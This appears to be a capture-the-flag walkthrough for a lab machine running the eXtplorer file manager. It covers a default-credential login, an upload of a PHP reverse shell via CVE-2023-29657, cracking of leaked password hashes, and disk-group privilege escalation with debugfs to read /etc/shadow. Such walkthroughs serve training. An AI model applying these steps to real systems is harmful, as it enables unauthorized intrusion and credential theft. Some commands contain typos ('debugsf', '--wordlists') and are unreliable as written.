# Introduction


# Objective


# Information Gathering 

Nmap Scans:

No readable results found

Gobuster Results:

===============================================================  
wordpress            (Status: 301) [Size: 320] [--> http://192.168.224.16/wordpress/]  
filemanager          (Status: 301) [Size: 322] [--> http://192.168.224.16/filemanager/]  
Progress: 100000 / 100000 (100.00%)


Let's check the filemanager subdomain. This subdomain opens to a login page with no version information available. However, the site is weakly protected with the common login credential 
"admin admin." 

Now that we have access, we see a page that appears to be a directory management system of files for the system. Let's review the files and see if there is any useful information that we can pull from the files.

*Useful Information:*
User names and password found in the /filmanager/config/htusers.php file

U - admin / P - 21232f297a57a5a743894a0e4a801fc3
U - dora / P - $2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS

The "dora" account password shows us  a hash that can be cracked using John the Ripper:

	john hash.txt --wordlists=/usr/share/wordlists/rockyou.txt


After viewing all of the files in the filemanager, we learn in the changelog.txt file that the currently running version of EXtplorer is at least 2.1.15. Since we know the version number we can research available exploits on the web.

# Service Enumeration

According to CVE-2023-29657, the current version of EXtplorer is vulnerable to insecure permissions and allows files to be uploaded directly to the file manager. Being that many of the files are .php types, we can attempt uploading a file with a reverse shell script in php.

	touch exploit.php

	vim exploit.php

For this payload we added a PHP Pentest Monkey reverse shell from RevShells as other PHP shell attempts failed.

With success, we gain a foothold as the user, "www-data" on a new shell. We can grant more stability by running

	bash -i

Now that we have a more stable shell, we can attempt to sign in to the "dora" account with our known password. 

	su dora 

Successfully, our cracked password works and we are now signed in as the dora user.

# Privilege Escalation

For escalation, we can check all available escalation points such as cron jobs, sudo commands, and suid files but there does not apprently shows any openings. 

However, we do notice that the "dora" user is part of the "6(disk)" group

	id 
	uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)

After some research, according to this support link, there is a privilege escalation technique for disk groups -> https://vk9-sec.com/disk-group-privilege-escalation/

First, we need to find the available path that is currently mounted on the root directory. To find this, we can run 

	df -h

*df stands for "disk free." This command will show users the amount of available and used disk space on mounted fielsystems. The -h parameter stands for "human-readable" format*

Output:

Filesystem                         Size  Used Avail Use% Mounted on
==🟡/dev/mapper/ubuntu--vg-ubuntu--lv ==🟡 9.8G  5.2G  4.2G  56% /
udev                               947M     0  947M   0% /dev
tmpfs                              992M     0  992M   0% /dev/shm
tmpfs                              199M  1.3M  198M   1% /run
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              992M     0  992M   0% /sys/fs/cgroup
/dev/loop0                          62M   62M     0 100% /snap/core20/1611
/dev/loop1                          64M   64M     0 100% /snap/core20/1852
/dev/sda2                          1.7G  215M  1.4G  14% /boot
/dev/loop2                          68M   68M     0 100% /snap/lxd/22753
/dev/loop3                          50M   50M     0 100% /snap/snapd/18596
/dev/loop4                          92M   92M     0 100% /snap/lxd/24061
tmpfs                              199M     0  199M   0% /run/user/1000


based on the output above, we need to run the highlighted filesystem with the debugfs command

	debugsf /dev/mapper/ubuntu--vg-ubuntu--lv

This opens the debug console and allows us to run commands with read-only permissions. Let's try navigating to the root directory

	cd /root

The above command throws no errors and allows us to enter into the root directory. In this directory we can directly call the cat command to read the proof.txt flag found inside.

TECHNICALLY, we have successfully solved the machine as all flags have been found. However we should gain root access directly for better security practices. 


Knowing we can read files directly we can attempt to find the root password in the /etc/passwd file

	cat /etc/passwd
	
This command throws no errors. Let's attempt to view the /etc/shadow directory.

	cat /etc/shadow

Surprisingly, the output is given to us and we are able to copy the contents of the root user's hashed password.

Using John the Ripper again, we can crack this password. All that is required is to place the password has in a .txt file.

	john root_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

With the above command we can successfully exit debugging mode with "exit" and switch over to the root account

	su root
	password: XXXXX

Now we have fully solved the machine!




